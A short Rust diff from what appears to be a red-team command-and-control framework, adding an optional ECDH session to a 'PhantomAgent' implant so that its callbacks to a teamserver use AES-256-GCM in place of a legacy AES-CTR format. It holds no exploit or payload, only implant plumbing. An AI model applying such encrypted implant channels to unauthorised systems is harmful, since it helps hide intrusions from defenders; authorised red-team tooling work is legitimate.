@@ -14,6 +14,7 @@ use red_cell_common::crypto::{
 
 use crate::command::PhantomState;
 use crate::config::PhantomConfig;
+use crate::ecdh::EcdhSession;
 use crate::error::PhantomError;
 use crate::protocol::AgentMetadata;
 use crate::transport::HttpTransport;
@@ -37,6 +38,11 @@ pub struct PhantomAgent {
     /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
     pub(super) callback_seq: u64,
     pub(super) state: PhantomState,
+    /// Active ECDH session when `listener_pub_key` is set in config.
+    ///
+    /// When `Some`, all post-registration traffic uses AES-256-GCM session
+    /// packets instead of the legacy Demon AES-CTR wire format.
+    pub(super) ecdh_session: Option<EcdhSession>,
 }
 
 impl PhantomAgent {
@@ -72,6 +78,7 @@ impl PhantomAgent {
             ctr_offset: 0,
             callback_seq: 1,
             state: PhantomState::default(),
+            ecdh_session: None,
         })
     }
 
